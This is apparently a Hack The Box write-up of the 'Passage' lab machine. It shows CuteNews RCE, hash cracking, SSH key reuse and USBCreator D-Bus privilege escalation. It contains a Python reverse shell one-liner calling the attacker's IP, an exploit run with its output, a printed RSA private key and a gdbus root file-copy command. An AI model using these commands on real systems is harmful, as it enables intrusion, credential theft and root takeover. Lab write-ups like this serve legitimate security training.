# Hack the box - Passage

IP: 10.10.10.206

# Enumeration
```
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.10.206
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 13:02 EST
Nmap scan report for 10.10.10.206
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds

```

## Surfing the website... RSS button
![Domain info](./images/domain_rss_button.png "Domain info")

## Add entry to /etc/hosts
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.215    academy.htb
10.10.10.215    dev-staging-01.academy.htb
10.10.10.216    laboratory.htb
10.10.10.216    git.laboratory.htb
127.0.0.1       gitlab.example.com
10.10.10.206    passage.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

## Checking .html
Using Cute News php framework:
![Cute PHP](./images/cutephp.png "Cute PHP")

## Cute PHP
CuteNew main directory, 2.1.2 version:
![Cute PHP](./images/cutenews_main.png "Cute PHP")

## Cute PHP RCE
CuteNews 2.1.2 Remote Code Execution Vulnerability:
[CuteNews 2.1.2 Remote Code Execution Vulnerability](https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194)

## Inverse shell
Inverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.48",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

CuteNews 2.1.2 RCE:
```
└─$ python3 ./48800.py                                                                                                                                                                                                                 1 ⨯



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://passage.htb          
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: EHih3lPXZh and password: EHih3lPXZh

=======================================================
Sending Payload
=======================================================
signature_key: 465fff594ff766ffc66dc65d4fa4c051-EHih3lPXZh
signature_dsi: 1f2190efe9d5f5d40dde75696de180ed
logged in user: EHih3lPXZh
============================
Dropping to a SHELL
============================


command > python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.48",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

In other shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -l -p 1111
/bin/sh: 0: can't access tty; job control turned off
$ whoami && pwd && id
www-data
/var/www/html/CuteNews/uploads
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

CuteNews Hashes Users, "undo":
![Undo user hashes](./images/hashes_users.png "Undo user hashes")


## Search users for user flag
```
$ ls /home
ls /home
nadav  paul
```

## Search users in php cutenews backend directories
```
$ pwd
pwd
/var/www/html/CuteNews/cdata/users
$ ls -la
ls -la
total 284
drwxrwxrwx  2 www-data www-data 4096 Dec 27 14:59 .
drwxrwxrwx 11 www-data www-data 4096 Dec 27 14:16 ..
-rw-r--r--  1 www-data www-data  117 Dec 27 10:48 06.php
-rw-r--r--  1 www-data www-data  233 Dec 27 10:08 09.php
-rw-r--r--  1 www-data www-data  193 Dec 27 14:16 0a.php
-rw-r--r--  1 www-data www-data   45 Dec 27 09:06 0c.php
-rw-r--r--  1 www-data www-data  117 Dec 27 09:42 10.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:30 13.php
-rw-r--r--  1 www-data www-data  125 Aug 30 16:23 16.php
-rw-r--r--  1 www-data www-data  117 Dec 27 09:11 17.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:09 19.php
-rw-r--r--  1 www-data www-data  129 Dec 27 14:00 1e.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:32 20.php
-rw-r--r--  1 www-data www-data  449 Dec 27 14:59 21.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:45 22.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:56 24.php
-rw-r--r--  1 www-data www-data  137 Dec 27 09:42 2e.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:46 30.php
-rw-r--r--  1 www-data www-data  109 Aug 31 14:54 32.php
-rw-r--r--  1 www-data www-data   45 Dec 27 09:02 38.php
-rw-r--r--  1 www-data www-data  609 Dec 27 09:11 3e.php
-rw-r--r--  1 www-data www-data  137 Dec 27 14:59 41.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:09 45.php
-rw-r--r--  1 www-data www-data  145 Dec 27 10:11 47.php
-rw-r--r--  1 www-data www-data  609 Dec 27 09:33 4b.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 52.php
-rw-r--r--  1 www-data www-data  109 Dec 27 14:00 58.php
-rw-r--r--  1 www-data www-data  229 Dec 27 10:15 5d.php
-rw-r--r--  1 www-data www-data  693 Dec 27 14:16 63.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:44 65.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 66.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:56 6b.php
-rw-r--r--  1 www-data www-data  197 Dec 27 10:44 6c.php
-rw-r--r--  1 www-data www-data  133 Aug 31 14:54 6e.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:44 74.php
-rwxr-xr-x  1 www-data www-data  117 Jun 18  2020 77.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 7a.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:32 83.php
-rwxr-xr-x  1 www-data www-data  109 Jun 18  2020 8f.php
-rw-r--r--  1 www-data www-data  609 Dec 27 11:26 90.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:44 92.php
-rw-r--r--  1 www-data www-data  117 Dec 27 14:16 94.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 97.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:45 98.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:46 9b.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:30 9c.php
-rw-r--r--  1 www-data www-data  137 Dec 27 09:33 9d.php
-rw-r--r--  1 www-data www-data  609 Dec 27 09:29 9f.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:46 aa.php
-rw-r--r--  1 www-data www-data  117 Dec 27 10:56 ae.php
-rwxr-xr-x  1 www-data www-data  489 Jun 18  2020 b0.php
-rw-r--r--  1 www-data www-data  137 Dec 27 09:29 ba.php
-rw-r--r--  1 www-data www-data  137 Dec 27 11:26 bc.php
-rw-r--r--  1 www-data www-data  117 Dec 27 11:26 c2.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 c8.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:48 cc.php
-rw-r--r--  1 www-data www-data  117 Dec 27 09:29 cd.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:44 cf.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d4.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d5.php
-rw-r--r--  1 www-data www-data 1213 Aug 31 14:55 d6.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:09 e0.php
-rw-r--r--  1 www-data www-data  609 Dec 27 09:42 e2.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:45 e4.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:30 e6.php
-rw-r--r--  1 www-data www-data  137 Dec 27 10:48 e8.php
-rw-r--r--  1 www-data www-data  445 Dec 27 14:00 ec.php
-rw-r--r--  1 www-data www-data  197 Dec 27 09:33 f3.php
-rw-r--r--  1 www-data www-data  609 Dec 27 10:32 fb.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 fc.php
-rw-r--r--  1 www-data www-data 3840 Aug 30 17:54 lines
-rw-r--r--  1 www-data www-data    0 Jun 18  2020 users.txt
$ cat * > users_info.txt

```
delete <?php die('Direct call - access denied'); ?> with vcode in users_info.txt, saved as processed_users_info.txt

its base 64, so we decode it... saved as b64_processed_users_info.txt

we have to process paul and nadav (users seen in /home) hashes... searching in b64_processed_users_info.txt file we find this two, checking with crack station:

nadav:
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 -> not found

paul:
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd -> atlanta1

# USER FLAG
so we change user...
```
$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews/cdata/users$ cd ~
cd ~
paul@passage:~$ ls
ls
Desktop    Downloads         Music     Public     user.txt
Documents  examples.desktop  Pictures  Templates  Videos
paul@passage:~$ cat user.txt
cat user.txt
05030245828a7306a648d97575178146

```

## paul ssh-key
```
paul@passage:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----
```
saved as id_rsa

## try to change to user nadav
there's nothing in paul's stuff
```
┌──(kali㉿kali)-[~/htb-passage/file]
└─$ ssh -i id_rsa paul@10.10.10.206     
load pubkey "id_rsa": invalid format
Last login: Mon Dec 28 05:27:53 2020 from 10.10.14.52
paul@passage:~$
```

```
paul@passage:~$ whoami && id && pwd && groups
paul
uid=1001(paul) gid=1001(paul) groups=1001(paul)
/home/paul
paul
```

Paul has Nadav's public key in his authorized_keys file, maybe Nadav has Paul's public key in his authorized_keys file too...
```
paul@passage:~$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```
```
paul@passage:~$ ssh nadav@10.10.10.206
The authenticity of host '10.10.10.206 (10.10.10.206)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.206' (ECDSA) to the list of known hosts.
Last login: Mon Dec 28 03:36:49 2020 from 127.0.0.1

nadav@passage:~$ exit
logout
Connection to 10.10.10.206 closed.
```
```
paul@passage:~$ ssh nadav@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Last login: Mon Dec 28 05:43:31 2020 from 10.10.10.206
nadav@passage:~$ 
```

## nadav ssh-key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----

## Nadav
```
nadav@passage:~$ whoami && id && pwd && groups
nadav
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
/home/nadav
nadav adm cdrom sudo dip plugdev lpadmin sambashare
nadav@passage:~$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

## LinEnum with linpeas
in yellowred:
nadav user in sudo group
```
====================================( Users Information )=====================================
[+] My user                                                                                                                                                                                                                                
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                                                                                      
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) ---------------------------------------------------yellowred-----------------                                                                                                              

[+] Do I have PGP keys?
                                                                                                                                                                                                                                           
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                              
                                                                                                                                                                                                                                           
[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                              
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                                                                                                                                      
gdb was found in PATH

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                    
                                                                                                                                                                                                                                           
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin---------------------------------------------------yellowred-----------------

``` 
interesting processes:
```
nadav@passage:~$ ps aux | grep root
...
root        935  0.0  0.1 228240  6256 ?        Sl   07:18   0:00 lightdm --session-child 12 15
...
root       1705  0.2  0.4 889580 17136 ?        Sl   07:18   0:00 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b
...
root       1991  0.1  0.4 235516 19712 ?        Sl   07:19   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
```

lightdm:
- https://www.exploit-db.com/exploits/41923

usb-creator-helper:
- https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/?web_view=true, by Nadav Markus ;)...
- https://en.wikipedia.org/wiki/D-Bus


A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu patched the relevant packages in response to a vulnerability disclosure from Unit 42.

Services available on the system bus:
```
nadav@passage:~$ qdbus --system
:1.0                                                                                                                                                                                                                                       
 org.freedesktop.systemd1
:1.14
 org.freedesktop.DisplayManager
:1.16
:1.17
:1.19
:1.2
 org.freedesktop.Accounts
:1.20
:1.21
:1.22
:1.23
 org.freedesktop.UPower
:1.24
:1.25
:1.26
:1.27
:1.28
:1.29
:1.3
 org.freedesktop.Avahi
:1.30
:1.33
:1.34
 org.freedesktop.RealtimeKit1
:1.35
 org.freedesktop.ColorManager
:1.36
:1.39
:1.4
 org.freedesktop.login1
:1.40
 org.freedesktop.UDisks2
:1.41
:1.43
:1.44
:1.45
:1.46
:1.47
:1.48
:1.49
 org.freedesktop.fwupd
:1.52
:1.53
:1.56
 com.ubuntu.USBCreator
:1.59
:1.60
:1.61
:1.62
:1.63
:1.68
:1.8
 org.freedesktop.NetworkManager
:1.9
 org.freedesktop.PolicyKit1
org.freedesktop.DBus
```

to invoke a method on a remote object:
```
nadav@passage:~$ gdbus --help
Unknown command '--help'
Usage:
  gdbus COMMAND

Commands:
  help         Shows this information
  introspect   Introspect a remote object
  monitor      Monitor a remote object
  call         Invoke a method on a remote object
  emit         Emit a signal

Use "gdbus COMMAND --help" to get help on each command.

nadav@passage:~$ gdbus call --help
Usage:                                                                                                                                                                                                                                     
  gdbus call [OPTION...]                                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
Invoke a method on a remote object.                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
Connection Endpoint Options:                                                                                                                                                                                                               
  -y, --system          Connect to the system bus                                                                                                                                                                                          
  -e, --session         Connect to the session bus                                                                                                                                                                                         
  -a, --address         Connect to given D-Bus address                                                                                                                                                                                     

Application Options:
  -d, --dest            Destination name to invoke method on
  -o, --object-path     Object path to invoke method on
  -m, --method          Method and interface name
  -t, --timeout         Timeout in seconds


```

# ROOT FLAG

```
nadav@passage:/$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/pwn true
()
nadav@passage:/$ cat /tmp/pwn 
cc37714bf9d23325a3a12bcb8607ebec
```

rabbit hole

631 port:

[Internet Printing Protocol](http://www.t1shopper.com/tools/port-number/631/)
[IPP exploit - CUPS](https://www.exploit-db.com/exploits/41233)
```
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                                                 
Active Internet connections (servers and established)                                                                                                                                                                                      
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               ---------------------------------------------------red-----------------
tcp        0      0 10.10.10.206:58044      10.10.14.17:4242        ESTABLISHED -               
tcp        0      0 10.10.10.206:22         10.10.14.52:48530       ESTABLISHED -               
tcp        0   5144 10.10.10.206:22         10.10.14.52:48708       ESTABLISHED -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 10.10.10.206:80         10.10.14.17:56442       ESTABLISHED -               
tcp6       0      0 10.10.10.206:80         10.10.14.17:56450       TIME_WAIT   -               
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:48722           0.0.0.0:*                           -               
udp6       0      0 :::39667                :::*                                -               
udp6       0      0 :::5353                 :::*                                -     
```
41233.py script exploit, seem unexploitable:
```
nadav@passage:~$ python2 41233.py -a 127.0.0.1 -b 631 -f

             lol ty google
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
              @0x00string
https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py

[*]     locate available printer
[-]     no printers
```
